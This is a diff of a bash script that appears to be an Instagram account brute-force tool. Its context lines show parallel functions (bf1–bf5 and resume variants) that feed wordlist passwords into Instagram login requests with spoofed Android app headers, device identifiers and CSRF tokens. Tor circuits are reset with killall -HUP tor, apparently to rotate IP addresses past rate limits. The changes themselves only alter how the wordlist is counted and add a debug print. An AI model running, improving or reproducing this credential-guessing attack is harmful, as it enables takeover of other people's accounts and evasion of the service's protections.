@@ -218,7 +218,10 @@ while [ $counter -lt $turn ]; do
 
 IFS=$'\n'
 for pass in $(sed -n ''$startline','$endline'p' $wl_pass); do
-count_pass=$(wc -l $wl_pass | cut -d " " -f1)
+#count_pass=$(wc -l $wl_pass | cut -d " " -f1)
+count_pass=$(wc -l $wl_pass | awk '{ print $1 }')
+
+
 header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
 
 data='{"phone_id":"'$phone'", "_csrftoken":"'$var2'", "username":"'$user'", "guid":"'$guid'", "device_id":"'$device'", "password":"'$pass'", "login_attempt_count":"0"}'
@@ -244,7 +247,10 @@ done
 bf2() {
 
 while [ $counter2 -lt $turn ]; do
-count_pass=$(wc -l $wl_pass | cut -d " " -f1)
+#count_pass=$(wc -l $wl_pass | cut -d " " -f1)
+count_pass=$(wc -l $wl_pass | awk '{ print $1 }')
+
+
 IFS=$'\n'
 for pass in $(sed -n ''$((startline+sumstart))','$endline'p' $wl_pass); do
 header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
@@ -273,7 +279,10 @@ done
 bf3() {
 
 while [ $counter3 -lt $turn ]; do
-count_pass=$(wc -l $wl_pass | cut -d " " -f1)
+#count_pass=$(wc -l $wl_pass | cut -d " " -f1)
+count_pass=$(wc -l $wl_pass | awk '{ print $1 }')
+
+
 IFS=$'\n'
 for pass in $(sed -n ''$((startline+sumstart))','$endline'p' $wl_pass); do
 header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
@@ -300,7 +309,10 @@ done
 
 bf4() {
 
-count_pass=$(wc -l $wl_pass | cut -d " " -f1)
+#count_pass=$(wc -l $wl_pass | cut -d " " -f1)
+count_pass=$(wc -l $wl_pass | awk '{ print $1 }')
+
+
 while [ $counter4 -lt $turn ]; do
 
 IFS=$'\n'
@@ -329,7 +341,10 @@ done
 bf5() {
 
 while [ $counter5 -lt $turn ]; do
-count_pass=$(wc -l $wl_pass | cut -d " " -f1)
+#count_pass=$(wc -l $wl_pass | cut -d " " -f1)
+count_pass=$(wc -l $wl_pass | awk '{ print $1 }')
+
+
 IFS=$'\n'
 for pass in $(sed -n ''$((startline+sumstart))','$endline'p' $wl_pass); do
 header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
@@ -362,7 +377,10 @@ startresume1=$((startresume+1))
 IFS=$'\n'
 for pass in $(sed -n ''$startresume1','$(($token+endline))'p' $wl_pass); do
 
-count_pass=$(wc -l $wl_pass | cut -d " " -f1)
+#count_pass=$(wc -l $wl_pass | cut -d " " -f1)
+count_pass=$(wc -l $wl_pass | awk '{ print $1 }')
+
+
 header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
 
 data='{"phone_id":"'$phone'", "_csrftoken":"'$var2'", "username":"'$user'", "guid":"'$guid'", "device_id":"'$device'", "password":"'$pass'", "login_attempt_count":"0"}'
@@ -387,7 +405,10 @@ done
 bf2resume() {
 
 while [ $counter2 -lt $turn ]; do
-count_pass=$(wc -l $wl_pass | cut -d " " -f1)
+#count_pass=$(wc -l $wl_pass | cut -d " " -f1)
+count_pass=$(wc -l $wl_pass | awk '{ print $1 }')
+
+
 IFS=$'\n'
 startresume=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1) 
 startresume1=$((startresume+1))
@@ -418,7 +439,10 @@ done
 bf3resume() {
 
 while [ $counter3 -lt $turn ]; do
-count_pass=$(wc -l $wl_pass | cut -d " " -f1)
+#count_pass=$(wc -l $wl_pass | cut -d " " -f1)
+count_pass=$(wc -l $wl_pass | awk '{ print $1 }')
+
+
 IFS=$'\n'
 startresume=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1) 
 startresume1=$((startresume+1))
@@ -449,7 +473,10 @@ done
 
 bf4resume() {
 
-count_pass=$(wc -l $wl_pass | cut -d " " -f1)
+#count_pass=$(wc -l $wl_pass | cut -d " " -f1)
+count_pass=$(wc -l $wl_pass | awk '{ print $1 }')
+
+
 while [ $counter4 -lt $turn ]; do
 
 IFS=$'\n'
@@ -484,7 +511,10 @@ done
 bf5resume() {
 
 while [ $counter5 -lt $turn ]; do
-count_pass=$(wc -l $wl_pass | cut -d " " -f1)
+#count_pass=$(wc -l $wl_pass | cut -d " " -f1)
+count_pass=$(wc -l $wl_pass | awk '{ print $1 }')
+
+
 IFS=$'\n'
 startresume=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1) 
 startresume1=$((startresume+1))
@@ -590,6 +620,8 @@ let turn-=60
 killall -HUP tor
 ###
 #pkill -f -HUP "tor -f multitor/multitor1"; pkill -f -HUP "tor -f multitor/multitor2"; pkill -f -HUP "tor -f multitor/multitor3"; pkill -f -HUP "tor -f multitor/multitor4"; pkill -f -HUP "tor -f multitor/multitor5"
+
+printf "countpass: $countpass, $count_pass: $count_pass"
 done
 exit 1
 esac
